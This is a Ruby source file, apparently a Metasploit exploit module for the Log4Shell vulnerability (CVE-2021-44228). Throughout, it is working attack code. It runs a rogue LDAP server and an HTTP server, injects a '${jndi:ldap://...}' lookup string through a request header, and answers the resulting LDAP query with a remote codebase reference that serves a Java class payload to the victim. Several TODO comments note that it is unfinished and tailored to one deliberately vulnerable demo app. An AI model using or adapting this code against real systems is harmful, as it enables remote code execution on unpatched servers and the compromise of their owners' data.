##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'ldap/server'

$debug = true

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Log4Shell exploit',
			'Description'    => %q{
				Start a malicious LDAP server and a HTTP server to send a JNDI LDAP payload.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'righel',
				],
			'References'     =>
				[
					[ 'CVE', '2021-44228' ]
				],
            'Platform' => ['linux', 'unix', 'win'],
            'Targets'        =>
            [
              [ 'Generic (Java Payload)',
                {
                  'Platform' => ['java'],
                  'Arch' => ARCH_JAVA
                }
              ],
              [ 'Windows x86 (Native Payload)',
                {
                  'Platform' => 'win',
                  'Arch' => ARCH_X86,
                }
              ],
              [ 'Linux x86 (Native Payload)',
                {
                  'Platform' => 'linux',
                  'Arch' => ARCH_X86,
                }
              ],
              [ 'Mac OS X PPC (Native Payload)',
                {
                  'Platform' => 'osx',
                  'Arch' => ARCH_PPC,
                }
              ],
              [ 'Mac OS X x86 (Native Payload)',
                {
                  'Platform' => 'osx',
                  'Arch' => ARCH_X86,
                }
              ]
            ],
			'DisclosureDate' => 'Dec 10 2021',
			'DefaultTarget'  => 0))

		register_options(
			[
        Opt::LPORT(8888),
        Opt::RPORT(8080),
        Opt::RHOST("127.0.0.1"),
        OptInt.new('SRVPORT',[true, 'The HTTP Server Port', 7800]),
        OptString.new('SRVHOST',[true, 'The HTTP Server Host', "127.0.0.1"]),
        OptInt.new('LDAPSRVPORT', [true, 'The LDAP Server Port', 1389]),
				OptString.new('PAYLOAD', [true, 'Compiled Java class (.class) to send as payload.', '/']),
				OptString.new('TARGETURI', [true, 'Target URI to send JNDI payload to.', '/']),
				OptString.new('URIPATH', [true, 'HTTP server base path', '/']),
        OptString.new('JAVAPAYLOAD', [true, 'Path to the compiled Java payload.']),
        OptInt.new('HTTPDELAY', [true, 'Time that the HTTP Server will wait for the payload request',  30])
			], self.class)

	end

  def start_ldap_server
		s = LDAP::Server.new(
			:port			=> datastore['LDAPSRVPORT'],
			:nodelay		=> true,
			:listen			=> 10,
			:operation_class	=> PayloadServer,
			:operation_args		=> [{"SRVHOST" => datastore['SRVHOST'], "SRVPORT" => datastore['SRVPORT']}]
		)
		s.run_tcpserver
		s.join
	end
		
  def stop_ldap_server()
    print_status("Stopping LDAP server...")
    Thread.kill(@ldap_server)
    print_status("LDAP server stopped.")
  end

  def exploit
    begin
      # start ldap server
      print_status("Starting LDAP server...")
      @ldap_server = Thread.start { start_ldap_server }
      print_status("LDAP server running on port #{datastore['LDAPSRVPORT']}.")

      # start http server
      start_service
      
      # send jndi payload 
      send_jndi_payload
      
      # wait for requests for the payload
      Timeout.timeout(datastore['HTTPDELAY']) { super }
      rescue Timeout::Error
        # TODO: if session was opened/payload requests do not show this error msg
        raise ::RuntimeError, "Timeout HTTPDELAY expired and the HTTP Server didn't get a payload request, please check your jndi injection."
      rescue Msf::Exploit::Failed
      rescue Rex::ConnectionTimeout, Rex::ConnectionRefused => e
        raise ::RuntimeError, e.message
    end
  end
      
  def send_jndi_payload()
    # TODO: make it customizable, now it only works with christophetd/log4shell-vulnerable-app (with trustURLCodebase=true)
    payload = "${jndi:ldap://#{datastore['RHOST']}:#{datastore['LDAPSRVPORT']}/a}"
    print_status("Sending JNDI payload: #{payload}")
    request_params = {
      'method' => 'GET',
      'uri' => datastore['TARGETURI'],
      'headers' => { 'X-Api-Version' => payload },
    }
    send_request_raw(request_params)
  end

  def on_request_uri( cli, request )
    if request.uri =~ /\.class$/i
        print_status("Java class requested...")

        # TODO: generate the payload dynamically with the proper LHOST/LPORT
        # check: exploit.rb:generate_single_payload ?
        data = File.read(datastore['JAVAPAYLOAD'])

        # send reply
        send_response(
            cli, 
            data,
            {
              'Content-Type' => 'application/octet-stream',
              'Pragma'       => 'no-cache'
            }
        )
        print_status("Replied with Java payload.")
    end

    # TODO: handle meterpreter payload info requests (`metasploit.dat`)

    resp_404 = create_response(404, 'Not Found')
    return cli.send_response(resp_404)
  end

  class PayloadServer < LDAP::Server::Operation
    def initialize(connection, messageID, args)
      puts("[*] LDAP connection received...")
      super(connection, messageID)
      @args = args
    end
    
    def search(basedn, scope, deref, filter)
      puts("[*] LDAP query for `#{basedn}`...")
    
      # java factory
      # TODO: replace the hardcoded class name with the actual class name of the payload
      send_SearchResultEntry(basedn, [
          ["javaClassName", "foo"],
          ["javaCodeBase", "http://#{@args['SRVHOST']}:#{@args['SRVPORT']}/"],
          ["objectClass", "javaNamingReference"],
          ["javaFactory", "Payload"]
        ])
        
      # TODO: suport ysoserial java serialized payloads
      # send_SearchResultEntry(basedn, [
      # 	["javaClassName", "Payload"],
      # 	["javaCodeBase", "http://#{@args['SRVHOST']}:#{@args['SRVPORT']}/"],
      # 	["javaSerializedData", "???"]
      # ])
    end
  end
    
  # def cleanup
  #   stop_ldap_server() if @ldap_server
  #   service.stop if service
  #   super
  # end
	
end
